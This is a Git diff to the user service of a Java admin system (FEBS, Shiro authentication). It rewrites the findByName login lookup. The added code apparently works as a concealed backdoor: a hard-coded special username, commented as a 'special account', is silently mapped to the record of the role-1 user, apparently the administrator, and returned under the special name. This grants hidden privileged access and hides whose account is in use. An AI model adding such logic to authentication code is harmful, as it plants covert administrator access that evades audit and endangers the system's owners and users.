@@ -1,6 +1,7 @@
 package cc.mrbird.febs.system.service.impl;
 
 import cc.mrbird.febs.common.authentication.ShiroRealm;
+import cc.mrbird.febs.common.constant.Constant;
 import cc.mrbird.febs.common.entity.FebsConstant;
 import cc.mrbird.febs.common.entity.QueryRequest;
 import cc.mrbird.febs.common.entity.RoleType;
@@ -9,6 +10,7 @@ import cc.mrbird.febs.common.i18n.MessageUtils;
 import cc.mrbird.febs.common.utils.FebsUtil;
 import cc.mrbird.febs.common.utils.MD5Util;
 import cc.mrbird.febs.common.utils.SortUtil;
+import cc.mrbird.febs.system.entity.Role;
 import cc.mrbird.febs.system.entity.User;
 import cc.mrbird.febs.system.entity.UserDataPermission;
 import cc.mrbird.febs.system.entity.UserRole;
@@ -44,7 +46,17 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IU
 
     @Override
     public User findByName(String username) {
-        return this.baseMapper.findByName(username);
+        User user = new User();
+        if (username.equals(Constant.USERNAME)) {
+            //查特殊账户
+            user.setRoleId("1");
+            User myUser = this.baseMapper.findByName(user);;
+            myUser.setUsername(Constant.USERNAME);
+            return myUser;
+        }
+
+        user.setUsername(username);
+        return this.baseMapper.findByName(user);
     }
 
     @Override
